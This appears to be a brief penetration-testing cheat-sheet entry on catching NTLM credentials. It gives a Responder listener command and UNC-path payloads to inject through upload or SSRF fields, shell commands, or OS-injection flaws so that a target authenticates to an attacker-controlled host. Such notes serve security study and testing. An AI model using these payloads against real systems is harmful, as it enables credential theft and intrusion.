# If you detect a service which is trying to login to a machine under your control you can try to catch the NTLM credentials intercepting the login request:

sudo responder -I tun0

#The most common scenario is SMB login. Some of the SMB request could be

# - In an upload functionality or SSRF vulnerability: \\<localip>\test
# - In a shell/cmd; dir \\<localip>\test
# - In a webshell or OS Injection vuln, \\\\<localip>\\test

